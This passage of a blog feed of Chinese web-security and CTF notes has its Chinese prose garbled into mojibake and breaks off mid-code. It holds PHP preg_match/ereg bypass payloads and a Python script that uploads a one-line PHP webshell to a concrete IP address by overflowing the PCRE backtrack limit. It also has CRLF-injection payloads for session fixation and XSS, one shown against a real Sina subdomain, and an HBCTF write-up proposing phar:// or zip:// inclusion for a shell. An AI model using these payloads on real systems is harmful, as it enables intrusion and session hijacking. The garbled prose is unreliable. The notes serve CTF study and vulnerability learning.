punctuation">}</span></code></pre><p><strong>eregå‡½æ•°çš„æ¼æ´ž</strong> ï¼š</p><ul><li>å­˜åœ¨%00æˆªæ–­ï¼ˆå·²è¢«preg_matchæ›¿ä»£ï¼‰</li><li>è¾“å…¥å‚æ•°ä¸ºæ•°ç»„æ—¶è¿”å›žå€¼ä¸ºnull</li></ul><p><img src="https://upload-images.jianshu.io/upload_images/6952387-98a1a60f7e3dc083.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/613" alt="img"></p><p>payloadï¼š</p><ul><li>?nctf=111%00%23biubiubiu</li><li>?nctf[]=aa</li></ul><h3 id="4ã€PHPçš„å¼±ç±»åž‹-æ•°ç»„ç»•è¿‡æ­£åˆ™"><a href="#4ã€PHPçš„å¼±ç±»åž‹-æ•°ç»„ç»•è¿‡æ­£åˆ™" class="headerlink" title="4ã€PHPçš„å¼±ç±»åž‹+æ•°ç»„ç»•è¿‡æ­£åˆ™"></a>4ã€PHPçš„å¼±ç±»åž‹+æ•°ç»„ç»•è¿‡æ­£åˆ™</h3><pre class=" language-php"><code class="language-php"><span class="token keyword">function</span> <span class="token function">is_valid</span><span class="token punctuation">(</span><span class="token variable">$title</span><span class="token punctuation">,</span> <span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token variable">$title</span> <span class="token punctuation">.</span> <span class="token variable">$data</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'|\A[ _a-zA-Z0-9]+\z|is'</span><span class="token punctuation">,</span> <span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">write_cache</span><span class="token punctuation">(</span><span class="token variable">$title</span><span class="token punctuation">,</span> <span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$dir</span> <span class="token operator">=</span> <span class="token function">changedir</span><span class="token punctuation">(</span><span class="token constant">CACHE_DIR</span> <span class="token punctuation">.</span> <span class="token function">get_username</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token string">'/'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_dir</span><span class="token punctuation">(</span><span class="token variable">$dir</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token variable">$dir</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string">'open_basedir'</span><span class="token punctuation">,</span> <span class="token variable">$dir</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_valid</span><span class="token punctuation">(</span><span class="token variable">$title</span><span class="token punctuation">,</span> <span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token string">"title or content error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token string">"{$dir}{$title}.php"</span><span class="token punctuation">;</span>    <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span> <span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string">'open_basedir'</span><span class="token punctuation">,</span> <span class="token constant">__DIR__</span> <span class="token punctuation">.</span> <span class="token string">'/'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><blockquote><p>preg_match()è¿”å›ž <code>pattern</code> çš„åŒ¹é…æ¬¡æ•°ã€‚ å®ƒçš„å€¼å°†æ˜¯0æ¬¡ï¼ˆä¸åŒ¹é…ï¼‰æˆ–1æ¬¡ï¼Œå› ä¸ºpreg_match()åœ¨ç¬¬ä¸€æ¬¡åŒ¹é…åŽ å°†ä¼šåœæ­¢æœç´¢ã€‚preg_match_all()ä¸åŒäºŽæ­¤ï¼Œå®ƒä¼šä¸€ç›´æœç´¢<code>subject</code> ç›´åˆ°åˆ°è¾¾ç»“å°¾ã€‚ å¦‚æžœå‘ç”Ÿé”™è¯¯preg_match()è¿”å›ž FALSEã€‚</p></blockquote><p>preg_matchæœ¬èº«å¹¶æ²¡æœ‰ä»€ä¹ˆé—®é¢˜ï¼Œä½†æ˜¯åœ¨æ­£åˆ™åŒ¹é…ä¹‹å‰ï¼Œ<code>$title</code>å’Œ<code>$content</code>è¿›è¡Œäº†å­—ç¬¦ä¸²è¿žæŽ¥ã€‚å¾—ç›ŠäºŽPHPçš„å¼±ç±»åž‹ç‰¹æ€§ï¼Œæ•°ç»„ä¼šè¢«å¼ºåˆ¶è½¬æ¢æˆå­—ç¬¦ä¸²ï¼Œä¹Ÿå°±æ˜¯<code>Array</code>ï¼ŒArrayè‚¯å®šæ˜¯æ»¡è¶³æ­£åˆ™<code>\A[ _a-zA-Z0-9]+\z</code>çš„ï¼Œæ‰€ä»¥ä¸ä¼šè¢«æ‹¦æˆªã€‚</p><p>file_put_contentså‡½æ•°å¯ä»¥å¤„ç†æ•°ç»„ï¼Œæ‰€ä»¥æž„é€ payload:<code>?title=s&amp;content[]=&lt;?php phpinfo();?&gt;</code></p><h4 id="åŽŸæ–‡"><a href="#åŽŸæ–‡" class="headerlink" title="åŽŸæ–‡"></a>åŽŸæ–‡</h4><p><a href="https://www.jianshu.com/p/8e3b9d056da6?utm_campaign=maleskine&amp;utm_content=note&amp;utm_medium=writer_share&amp;utm_source=weibo">https://www.jianshu.com/p/8e3b9d056da6?utm_campaign=maleskine&amp;utm_content=note&amp;utm_medium=writer_share&amp;utm_source=weibo</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>PHPï¼špreg_match()ç»•è¿‡</title>
      <link href="2021/09/12/php-preg-match-rao-guo/"/>
      <url>2021/09/12/php-preg-match-rao-guo/</url>
      
        <content type="html"><![CDATA[<h3 id="1ã€æ•°ç»„ç»•è¿‡"><a href="#1ã€æ•°ç»„ç»•è¿‡" class="headerlink" title="1ã€æ•°ç»„ç»•è¿‡"></a>1ã€æ•°ç»„ç»•è¿‡</h3><p>preg_matchåªèƒ½å¤„ç†å­—ç¬¦ä¸²ï¼Œå½“ä¼ å…¥çš„subjectæ˜¯æ•°ç»„æ—¶ä¼šè¿”å›žfalse</p><h3 id="2ã€PCREå›žæº¯æ¬¡æ•°é™åˆ¶"><a href="#2ã€PCREå›žæº¯æ¬¡æ•°é™åˆ¶" class="headerlink" title="2ã€PCREå›žæº¯æ¬¡æ•°é™åˆ¶"></a>2ã€PCREå›žæº¯æ¬¡æ•°é™åˆ¶</h3><p><a href="https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html">PHPåˆ©ç”¨PCREå›žæº¯æ¬¡æ•°é™åˆ¶ç»•è¿‡æŸäº›å®‰å…¨é™åˆ¶</a></p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">from</span> io <span class="token keyword">import</span> BytesIOfiles <span class="token operator">=</span> <span class="token punctuation">{</span>  <span class="token string">'file'</span><span class="token punctuation">:</span> BytesIO<span class="token punctuation">(</span>b<span class="token string">'aaa&lt;?php eval($_POST[txt]);//'</span> <span class="token operator">+</span> b<span class="token string">'a'</span> <span class="token operator">*</span> <span class="token number">1000000</span><span class="token punctuation">)</span><span class="token punctuation">}</span>res <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span><span class="token string">'http://51.158.75.42:8088/index.php'</span><span class="token punctuation">,</span> files<span class="token operator">=</span>files<span class="token punctuation">,</span> allow_redirects<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">.</span>headers<span class="token punctuation">)</span></code></pre><p><code>pcre.backtrack_limit</code>ç»™pcreè®¾å®šäº†ä¸€ä¸ªå›žæº¯æ¬¡æ•°ä¸Šé™ï¼Œé»˜è®¤ä¸º1000000ï¼Œå¦‚æžœå›žæº¯æ¬¡æ•°è¶…è¿‡è¿™ä¸ªæ•°å­—ï¼Œpreg_matchä¼šè¿”å›žfalse</p><p><code>.</code>ä¸ä¼šåŒ¹é…æ¢è¡Œç¬¦ï¼Œå¦‚</p><h3 id="3ã€æ¢è¡Œç¬¦"><a href="#3ã€æ¢è¡Œç¬¦" class="headerlink" title="3ã€æ¢è¡Œç¬¦"></a>3ã€æ¢è¡Œç¬¦</h3><pre><code>if (preg_match('/^.*(flag).*$/', $json)) {    echo 'Hacking attempt detected&lt;br/&gt;&lt;br/&gt;';}</code></pre><p>åªéœ€è¦</p><pre><code>$json="\nflag"</code></pre><p>è€Œåœ¨éžå¤šè¡Œæ¨¡å¼ä¸‹ï¼Œ<code>$</code>ä¼¼ä¹Žä¼šå¿½ç•¥åœ¨å¥å°¾çš„<code>%0a</code></p><pre><code>if (preg_match('/^flag$/', $_GET['a']) &amp;&amp; $_GET['a'] !== 'flag') {    echo $flag;}</code></pre><p>åªéœ€è¦ä¼ å…¥</p><pre><code>?a=flag%0a</code></pre><p>åŽŸæ–‡ï¼š<a href="https://www.cnblogs.com/20175211lyz/p/12198258.html">https://www.cnblogs.com/20175211lyz/p/12198258.html</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>CRLFæ¼æ´ž</title>
      <link href="2021/09/11/crlf-lou-dong/"/>
      <url>2021/09/11/crlf-lou-dong/</url>
      
        <content type="html"><![CDATA[<p>åŽŸæ–‡ï¼š<a href="https://link.jianshu.com/?t=http://www.codesec.net/view/50272.html">http://www.codesec.net/view/50272.html</a></p><p>CRLFæ˜¯â€å›žè½¦+æ¢è¡Œâ€ï¼ˆ\r\nï¼‰çš„ç®€ç§°ã€‚åœ¨HTTPåè®®ä¸­ï¼ŒHTTPHeaderä¸ŽHTTPBodyæ˜¯ç”¨ä¸¤ä¸ªCRLFåˆ†éš”çš„ï¼Œæµè§ˆå™¨å°±æ˜¯æ ¹æ®è¿™ä¸¤ä¸ªCRLFæ¥å–å‡ºHTTPå†…å®¹å¹¶æ˜¾ç¤ºå‡ºæ¥ã€‚æ‰€ä»¥ï¼Œä¸€æ—¦æˆ‘ä»¬èƒ½å¤ŸæŽ§åˆ¶HTTPæ¶ˆæ¯å¤´ä¸­çš„å­—ç¬¦ï¼Œæ³¨å…¥ä¸€äº›æ¶æ„çš„æ¢è¡Œï¼Œè¿™æ ·æˆ‘ä»¬å°±èƒ½æ³¨å…¥ä¸€äº›ä¼šè¯Cookieæˆ–è€…HTMLä»£ç ï¼Œæ‰€ä»¥CRLFInjectionåˆå«HTTPResponseSplittingï¼Œç®€ç§°HRSã€‚</p><p>HRSæ˜¯æ¯”XSSå±å®³æ›´å¤§çš„å®‰å…¨é—®é¢˜ï¼Œå…·ä½“æ˜¯ä¸ºä»€ä¹ˆï¼Œæˆ‘ä»¬å¾€ä¸‹çœ‹ã€‚</p><p>å¯¹äºŽHRSæœ€ç®€å•çš„åˆ©ç”¨æ–¹å¼æ˜¯æ³¨å…¥ä¸¤ä¸ª\r\nï¼Œä¹‹åŽåœ¨å†™å…¥XSSä»£ç ï¼Œæ¥æž„é€ ä¸€ä¸ªxssã€‚</p><h3 id="0x01-å®žä¾‹"><a href="#0x01-å®žä¾‹" class="headerlink" title="0x01 å®žä¾‹"></a>0x01 å®žä¾‹</h3><p> ä¸¾ä¸ªä¾‹å­ï¼Œä¸€èˆ¬ç½‘ç«™ä¼šåœ¨HTTPå¤´ä¸­ç”¨Location:<a href="https://link.jianshu.com/?t=http://baidu.com">http://baidu.com</a>è¿™ç§æ–¹å¼æ¥è¿›è¡Œ302è·³è½¬ï¼Œæ‰€ä»¥æˆ‘ä»¬èƒ½æŽ§åˆ¶çš„å†…å®¹å°±æ˜¯Location:åŽé¢çš„XXXæŸä¸ªç½‘å€ã€‚</p><p>æ‰€ä»¥ä¸€ä¸ªæ­£å¸¸çš„302è·³è½¬åŒ…æ˜¯è¿™æ ·ï¼š</p><pre class=" language-dart"><code class="language-dart">HTTP<span class="token operator">/</span><span class="token number">1.1</span> <span class="token number">302</span> Moved Temporarily Date<span class="token punctuation">:</span> Fri<span class="token punctuation">,</span> <span class="token number">27</span> Jun <span class="token number">2014</span> <span class="token number">17</span><span class="token punctuation">:</span><span class="token number">52</span><span class="token punctuation">:</span><span class="token number">17</span> GMT Content<span class="token operator">-</span> Type<span class="token punctuation">:</span> text<span class="token operator">/</span>htmlContent<span class="token operator">-</span>Length<span class="token punctuation">:</span> <span class="token number">154</span> Connection<span class="token punctuation">:</span> closeLocation<span class="token punctuation">:</span>http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>www<span class="token punctuation">.</span>sina<span class="token punctuation">.</span>com<span class="token punctuation">.</span>cn</code></pre><p>ä½†å¦‚æžœæˆ‘ä»¬è¾“å…¥çš„æ˜¯</p><p>[<a href="http://www.sina.com.cn%0aSet-cookie:JSPSESSID%3Dwooyun]">http://www.sina.com.cn%0aSet-cookie:JSPSESSID%3Dwooyun]</a>(<a href="https://link.jianshu.com/?t=http://www.sina.com.cn">https://link.jianshu.com?t=http://www.sina.com.cn</a> Set-cookie:JSPSESSID%3Dwooyun)<br> æ³¨å…¥äº†ä¸€ä¸ªæ¢è¡Œï¼Œæ­¤æ—¶çš„è¿”å›žåŒ…å°±ä¼šå˜æˆè¿™æ ·ï¼š</p><pre class=" language-dart"><code class="language-dart">HTTP<span class="token operator">/</span><span class="token number">1.1</span> <span class="token number">302</span> Moved Temporarily Date<span class="token punctuation">:</span> Fri<span class="token punctuation">,</span> <span class="token number">27</span> Jun <span class="token number">2014</span> <span class="token number">17</span><span class="token punctuation">:</span><span class="token number">52</span><span class="token punctuation">:</span><span class="token number">17</span> GMTContent<span class="token operator">-</span>Type<span class="token punctuation">:</span> text<span class="token operator">/</span>html Content<span class="token operator">-</span>Length<span class="token punctuation">:</span> <span class="token number">154</span> Connection<span class="token punctuation">:</span> close Location<span class="token punctuation">:</span> http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>www<span class="token punctuation">.</span>sina<span class="token punctuation">.</span>com<span class="token punctuation">.</span>cn Set<span class="token operator">-</span>cookie<span class="token punctuation">:</span> JSPSESSID<span class="token operator">=</span>wooyun</code></pre><p>è¿™ä¸ªæ—¶å€™è¿™æ ·æˆ‘ä»¬å°±ç»™è®¿é—®è€…è®¾ç½®äº†ä¸€ä¸ªSESSIONï¼Œé€ æˆä¸€ä¸ªâ€œä¼šè¯å›ºå®šæ¼æ´žâ€ã€‚</p><p>å½“ç„¶ï¼ŒHRSå¹¶ä¸ä»…é™äºŽä¼šè¯å›ºå®šï¼Œé€šè¿‡æ³¨å…¥ä¸¤ä¸ªCRLFå°±èƒ½é€ æˆä¸€ä¸ªæ— è§†æµè§ˆå™¨Filterçš„åå°„åž‹XSSã€‚</p><p>æ¯”å¦‚ä¸€ä¸ªç½‘ç«™æŽ¥å—urlå‚æ•°<a href="https://link.jianshu.com/?t=http://test.sina.com.cn/?url=xxx">http://test.sina.com.cn/?url=xxx</a>ï¼Œxxxæ”¾åœ¨LocationåŽé¢ä½œä¸ºä¸€ä¸ªè·³è½¬ã€‚å¦‚æžœæˆ‘ä»¬è¾“å…¥çš„æ˜¯</p><p><a href="https://link.jianshu.com/?t=http://test.sina.com.cn/?url=">http://test.sina.com.cn/?url=%0d%0a%0d%0a</a>&lt;imgsrc=1onerror=alert(/xss/)&gt;<br> æˆ‘ä»¬çš„è¿”å›žåŒ…å°±ä¼šå˜æˆè¿™æ ·ï¼š</p><p>HTTP/1.1 302 Moved Temporarily Date: Fri, 27 Jun 2014 17:52:17 GMT  Content-Type: text/html Content-Length: 154 Connection: close Location:  <img src="/2021/09/11/crlf-lou-dong/1" onerror="alert(/xss/)"><br> ä¹‹å‰è¯´äº†æµè§ˆå™¨ä¼šæ ¹æ®ç¬¬ä¸€ä¸ªCRLFæŠŠHTTPåŒ…åˆ†æˆå¤´å’Œä½“ï¼Œç„¶åŽå°†ä½“æ˜¾ç¤ºå‡ºæ¥ã€‚äºŽæ˜¯æˆ‘ä»¬è¿™é‡Œè¿™ä¸ªæ ‡ç­¾å°±ä¼šæ˜¾ç¤ºå‡ºæ¥ï¼Œé€ æˆä¸€ä¸ªXSSã€‚</p><p>ä¸ºä»€ä¹ˆè¯´æ˜¯æ— è§†æµè§ˆå™¨filterçš„ï¼Œè¿™é‡Œæ¶‰åŠåˆ°å¦ä¸€ä¸ªé—®é¢˜ã€‚</p><p>æµè§ˆå™¨çš„Filteræ˜¯æµè§ˆå™¨åº”å¯¹ä¸€äº›åå°„åž‹XSSåšçš„ä¿æŠ¤ç­–ç•¥ï¼Œå½“urlä¸­å«æœ‰XSSç›¸å…³ç‰¹å¾çš„æ—¶å€™å°±ä¼šè¿‡æ»¤æŽ‰ä¸æ˜¾ç¤ºåœ¨é¡µé¢ä¸­ï¼Œæ‰€ä»¥ä¸èƒ½è§¦å‘XSSã€‚</p><p>æ€Žæ ·æ‰èƒ½å…³æŽ‰filterï¼Ÿä¸€èˆ¬æ¥è¯´ç”¨æˆ·è¿™è¾¹æ˜¯ä¸è¡Œçš„ï¼Œåªæœ‰æ•°æ®åŒ…ä¸­httpå¤´å«æœ‰X-XSS-Protectionå¹¶ä¸”å€¼ä¸º0çš„æ—¶å€™ï¼Œæµè§ˆå™¨æ‰ä¸ä¼šå¼€å¯filterã€‚</p><p>è¯´åˆ°è¿™é‡Œåº”è¯¥å°±å¾ˆæ¸…æ¥šäº†ï¼ŒHRSä¸æ­£æ˜¯æ³¨å…¥HTTPå¤´çš„ä¸€ä¸ªæ¼æ´žå—ï¼Œæˆ‘ä»¬å¯ä»¥å°†X-XSS-Protection:0æ³¨å…¥åˆ°æ•°æ®åŒ…ä¸­ï¼Œå†ç”¨ä¸¤ä¸ªCRLFæ¥æ³¨å…¥XSSä»£ç ï¼Œè¿™æ ·å°±æˆåŠŸåœ°ç»•è¿‡äº†æµè§ˆå™¨filterï¼Œå¹¶ä¸”æ‰§è¡Œæˆ‘ä»¬çš„åå°„åž‹XSSã€‚</p><p>æ‰€ä»¥è¯´HRSçš„å±å®³å¤§äºŽXSSï¼Œå› ä¸ºå®ƒèƒ½ç»•è¿‡ä¸€èˆ¬XSSæ‰€ç»•ä¸è¿‡çš„filterï¼Œå¹¶èƒ½äº§ç”Ÿä¼šè¯å›ºå®šæ¼æ´žã€‚</p><p>æˆ‘ä»¬æ¥ä¸€ä¸ªçœŸå®žæ¡ˆä¾‹å§ã€‚ æ–°æµªæŸåˆ†ç«™å«æœ‰ä¸€ä¸ªurlè·³è½¬æ¼æ´žï¼Œå±å®³å¹¶ä¸å¤§ï¼ŒäºŽæ˜¯æˆ‘å°±æƒ³åˆ°äº†CRLFInjectionï¼Œå½“æˆ‘æµ‹è¯•</p><p><a href="https://link.jianshu.com/?t=http://xxx.sina.com.cn/?url=">http://xxx.sina.com.cn/?url=%0a%0d%0a%0d%3Cimg%20src=1%3E</a><br> çš„æ—¶å€™ï¼Œå‘çŽ°å›¾ç‰‡å·²ç»è¾“å‡ºåœ¨é¡µé¢ä¸­äº†ï¼Œè¯´æ˜ŽCRLFæ³¨å…¥æˆåŠŸäº†ï¼š</p><p><img src="https://upload-images.jianshu.io/upload_images/5557607-e18180bd46ba67d9.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/659" alt="img"></p><p>Paste_Image.png</p><p>é‚£ä¹ˆæˆ‘ä»¬è¯•è¯•XSSçœ‹çœ‹ï¼š</p><p><img src="https://upload-images.jianshu.io/upload_images/5557607-2dfa3e0ca5f573d3.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/879" alt="img"></p><p>Paste_Image.png</p><p>@mramydneiè¿˜æƒ³åˆ°äº†ä¸€ä¸ªåˆ©ç”¨å­—ç¬¦ç¼–ç æ¥ç»•è¿‡XSSFilterçš„æ–¹æ³•ï¼Œå½“ç¼–ç æ˜¯is-2022-kræ—¶æµè§ˆå™¨ä¼šå¿½ç•¥%0fï¼Œè¿™æ ·æˆ‘ä»¬åœ¨onerroråŽé¢åŠ ä¸ª%0få°±èƒ½ç»•è¿‡filterï¼Œå‰ææ˜¯æ³¨å…¥ä¸€ä¸ª</p><p>&lt;metacharset=ISO-2022-KR&gt;</p><p><img src="https://upload-images.jianshu.io/upload_images/5557607-62d386e1e365d69a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/924" alt="img"></p><p>Paste_Image.png</p><p>å½“ç„¶ï¼Œåœ¨Location:è¿™é‡Œæ³¨å…¥åªæœ‰webkitå†…æ ¸æµè§ˆå™¨æ‰èƒ½å¤Ÿåˆ©ç”¨ï¼Œå…¶ä»–æµè§ˆå™¨å¯èƒ½ä¼šè·³è½¬ã€å‡ºé”™ã€‚ä¸è¿‡å¯¹äºŽchromeçš„ä½¿ç”¨é‡æ¥è¯´ï¼Œå±å®³å·²ç»è¶³å¤Ÿäº†ã€‚</p><h3 id="0x02-ä¿®å¤"><a href="#0x02-ä¿®å¤" class="headerlink" title="0x02 ä¿®å¤"></a>0x02 ä¿®å¤</h3><p> å¦‚ä½•ä¿®å¤HRSæ¼æ´žï¼Œå½“ç„¶æ˜¯è¿‡æ»¤\rã€\nä¹‹ç±»çš„æ¢è¡Œç¬¦ï¼Œé¿å…è¾“å…¥çš„æ•°æ®æ±¡æŸ“åˆ°å…¶ä»–HTTPå¤´</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>HBCTFï¼š2017-å¤§ç¾Žè¥¿å®‰</title>
      <link href="2021/09/09/hbctf-2017-da-mei-xi-an/"/>
      <url>2021/09/09/hbctf-2017-da-mei-xi-an/</url>
      
        <content type="html"><![CDATA[<p>æ³¨å†Œç™»å½•ï¼š</p><p><img src="/2021/09/09/hbctf-2017-da-mei-xi-an/image-20210909130939024.png" alt="image-20210909130939024"></p><p>æ”¶è—ä¿å­˜åŒå†™ç»•è¿‡</p><p><img src="/2021/09/09/hbctf-2017-da-mei-xi-an/image-20210909133350048.png" alt="image-20210909133350048"></p><h5 id="index-php"><a href="#index-php" class="headerlink" title="index.php"></a>index.php</h5><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$file</span>  <span class="token operator">=</span> <span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">:</span><span class="token string">"home"</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// echo $file;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/\.\.|^[\s]*\/|^[\s]*php:|filter/i'</span><span class="token punctuation">,</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>       <span class="token keyword">echo</span> "<span class="token markup">&lt;div class=\"msg error\" id=\"message\"></span>        <span class="token markup">&lt;i class=\"fa fa-exclamation-triangle\"></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>i</span><span class="token punctuation">></span></span></span>Attack Detected<span class="token operator">!</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span></span>"<span class="token punctuation">;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token variable">$file</span><span class="token punctuation">.</span><span class="token string">".php"</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">||</span><span class="token operator">!</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'userid'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>      <span class="token function">header</span><span class="token punctuation">(</span><span class="token string">"Location: index.php?file=login"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span></code></pre><p>index.phpä¸­æœ‰ä¸€è¡Œ<code>$filename = $file.".php";</code>å¯ä»¥åŒ…å«ç”¨ä¼ªåè®®getshellã€‚<br> æ¯”å¦‚phar:// zip://<br> æ°å¥½è¿™é¢˜æœ‰ä¸ªæ–‡ä»¶ä¸Šä¼ åŠŸèƒ½ã€‚æ”¹åŽç¼€åå°±å¯ä»¥äº†ã€‚ç„¶åŽé…åˆgetshell</p><h5 id="upload-php"><a href="#upload-php" class="headerlink" title="upload.php"></a>upload.php</h5><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span> <span class="token shell-comment comment">#defined(</span><span class="token string">"DIR_PERMITION"</span><span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"Access denied!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">||</span><span class="token operator">!</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'userid'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>      <span class="token function">header</span><span class="token punctuation">(</span><span class="token string">"Location: index.php?file=login"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token variable">$seed</span> <span class="token operator">=</span> <span class="token function">rand</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token function">getrandmax</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">mt_srand</span><span class="token punctuation">(</span><span class="token variable">$seed</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"error"</span><span class="token punctuation">]</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">echo</span> "<span class="token markup">&lt;div class=\"msg error\" id=\"message\"></span>        <span class="token markup">&lt;i class=\"fa fa-exclamation-triangle\"></span>uplpad file error<span class="token operator">!</span><span class="token punctuation">:</span><span class="token string">".$_FILES["</span>file<span class="token string">"]["</span>error<span class="token string">"]."</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>i</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span></span>"<span class="token punctuation">;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token variable">$fileTypeCheck</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"type"</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">"image/gif"</span><span class="token punctuation">)</span>            <span class="token operator">||</span> <span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"type"</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">"image/jpeg"</span><span class="token punctuation">)</span>            <span class="token operator">||</span> <span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"type"</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">"image/pjpeg"</span><span class="token punctuation">)</span>            <span class="token operator">||</span> <span class="token punctuation">(</span><span 